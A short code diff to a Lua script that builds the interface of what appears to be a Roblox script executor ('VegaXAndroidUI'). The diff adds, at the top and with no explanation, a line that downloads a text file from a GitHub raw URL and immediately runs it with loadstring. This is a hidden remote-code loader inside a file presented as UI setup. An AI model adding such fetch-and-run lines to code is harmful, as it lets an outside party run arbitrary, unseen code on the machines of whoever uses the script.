@@ -3,6 +3,9 @@
 
 -- Instances:
 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/notificationss.txt", true))()
+
 local VegaXAndroidUI = Instance.new("ScreenGui")
 local SettingsWindow = Instance.new("Frame")
 local WindowMainTitle = Instance.new("TextLabel")
